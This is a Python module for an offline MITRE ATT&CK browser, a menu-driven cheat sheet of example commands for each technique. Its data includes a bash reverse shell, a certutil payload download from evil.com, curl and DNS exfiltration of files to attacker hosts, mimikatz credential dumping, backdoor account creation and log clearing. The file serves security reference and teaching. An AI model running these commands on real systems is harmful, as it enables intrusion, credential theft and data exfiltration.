"""MITRE ATT&CK Technique Wiki — Offline browser with examples and commands."""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, show_results_panel)

MITRE_TACTICS = {
    "Reconnaissance": {
        "T1595": ("Active Scanning", "Adversary scans victim IP space",
                  ["nmap -sV -sC target", "masscan -p1-65535 target"]),
        "T1592": ("Gather Victim Host Info", "Discover hardware/software configs",
                  ["whatweb target", "wappalyzer"]),
        "T1589": ("Gather Victim Identity Info", "Find emails, credentials, names",
                  ["theHarvester -d target -b all", "sherlock username"]),
    },
    "Initial Access": {
        "T1566": ("Phishing", "Deliver malicious content via email",
                  ["gophish", "setoolkit"]),
        "T1190": ("Exploit Public-Facing App", "Exploit web vulns for access",
                  ["sqlmap -u 'url?id=1'", "searchsploit service version"]),
        "T1078": ("Valid Accounts", "Use stolen/default credentials",
                  ["hydra -l user -P wordlist target ssh"]),
    },
    "Execution": {
        "T1059": ("Command-Line Interface", "Execute via cmd/bash/PowerShell",
                  ["bash -i >& /dev/tcp/ip/port 0>&1", "powershell -enc <base64>"]),
        "T1203": ("Exploitation for Client Execution", "Exploit client-side vulns",
                  ["msfvenom -p windows/meterpreter/reverse_tcp"]),
    },
    "Persistence": {
        "T1098": ("Account Manipulation", "Modify account for persistence",
                  ["net user hacker P@ss /add", "useradd -m -s /bin/bash hacker"]),
        "T1053": ("Scheduled Task/Job", "Use cron/scheduled tasks",
                  ["crontab -e", "schtasks /create"]),
        "T1547": ("Boot or Logon Autostart", "Auto-start malware",
                  ["systemctl enable service", "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"]),
    },
    "Privilege Escalation": {
        "T1548": ("Abuse Elevation Control", "Bypass UAC, sudo abuse",
                  ["sudo -l", "find / -perm -4000"]),
        "T1068": ("Exploitation for Privilege Escalation", "Kernel exploits",
                  ["searchsploit linux kernel", "uname -a"]),
    },
    "Defense Evasion": {
        "T1070": ("Indicator Removal", "Clear logs/history",
                  ["history -c", "wevtutil cl Security"]),
        "T1027": ("Obfuscated Files", "Encode/encrypt payloads",
                  ["base64 payload.sh", "msfvenom --encoder"]),
        "T1218": ("System Binary Proxy Execution", "LOLBins for execution",
                  ["certutil -urlcache -f http://evil.com/payload.exe c:\\payload.exe"]),
    },
    "Credential Access": {
        "T1003": ("OS Credential Dumping", "Dump passwords/hashes",
                  ["mimikatz sekurlsa::logonpasswords", "hashdump"]),
        "T1110": ("Brute Force", "Online/offline password cracking",
                  ["hydra -l admin -P rockyou.txt target ssh", "hashcat -m 0 hash.txt rockyou.txt"]),
    },
    "Lateral Movement": {
        "T1021": ("Remote Services", "Use SSH/RDP/SMB to move",
                  ["ssh user@target", "psexec.py user:pass@target"]),
        "T1550": ("Use Alternate Auth Material", "Pass-the-hash/ticket",
                  ["pth-winexe -U user%hash //target cmd", "rubeus.exe ptt /ticket:ticket.kirbi"]),
    },
    "Collection": {
        "T1005": ("Data from Local System", "Find sensitive files",
                  ["find / -name '*.conf' -readable", "dir /s /b *.txt *.doc *.xls"]),
        "T1113": ("Screen Capture", "Take screenshots",
                  ["screencapture /tmp/screen.png", "import -window root /tmp/screen.png"]),
    },
    "Exfiltration": {
        "T1041": ("Exfil Over C2 Channel", "Use existing C2 for data",
                  ["curl -X POST -d @data.txt http://attacker/upload"]),
        "T1048": ("Exfil Over Alternative Protocol", "DNS, ICMP exfil",
                  ["xxd -p secret.txt | while read l; do dig $l.evil.com; done"]),
    },
    "Impact": {
        "T1486": ("Data Encrypted for Impact", "Ransomware behavior",
                  ["# Educational reference only — ransomware is illegal"]),
        "T1489": ("Service Stop", "Stop critical services",
                  ["systemctl stop target_service", "net stop 'Service Name'"]),
    },
}


def _search_techniques(query):
    """Search across all techniques."""
    query_lower = query.lower()
    results = []
    for tactic, techniques in MITRE_TACTICS.items():
        for tid, (name, desc, cmds) in techniques.items():
            if (query_lower in name.lower() or query_lower in desc.lower()
                    or query_lower in tid.lower() or query_lower in tactic.lower()):
                results.append((tactic, tid, name, desc, cmds))
    return results


def run(session):
    show_stage_header("MITRE ATT&CK Wiki", "Offline technique browser with examples")

    while True:
        options = [("", "[bold white]── TACTICS ──[/bold white]")]
        tactics = list(MITRE_TACTICS.keys())
        for i, tactic in enumerate(tactics):
            count = len(MITRE_TACTICS[tactic])
            options.append((str(i + 1), f"[bold]{tactic}[/bold] ({count} techniques)"))

        options.append(("", "[bold white]── SEARCH ──[/bold white]"))
        options.append((str(len(tactics) + 1), "[bold]Search Techniques[/bold]"))
        options.append(("0", "Back to Main Menu"))

        choice = show_menu(options)
        if choice == "0":
            return

        if choice == str(len(tactics) + 1):
            query = ask("Search query")
            results = _search_techniques(query)
            if not results:
                warning("No techniques found.")
                continue
            console.print(f"\n[bold green]Found {len(results)} techniques:[/bold green]\n")
            for tactic, tid, name, desc, cmds in results:
                console.print(f"  [bold cyan]{tid}[/bold cyan] [{tactic}] [bold]{name}[/bold]")
                console.print(f"    [dim]{desc}[/dim]")
                for cmd in cmds:
                    console.print(f"    [yellow]$[/yellow] {cmd}")
                console.print()
            continue

        idx = int(choice) - 1
        if idx >= len(tactics):
            continue

        tactic = tactics[idx]
        console.print(f"\n[bold cyan]═══ {tactic.upper()} ═══[/bold cyan]\n")
        for tid, (name, desc, cmds) in MITRE_TACTICS[tactic].items():
            console.print(f"  [bold cyan]{tid}[/bold cyan] [bold]{name}[/bold]")
            console.print(f"    [dim]{desc}[/dim]")
            for cmd in cmds:
                console.print(f"    [yellow]$[/yellow] {cmd}")
            console.print()
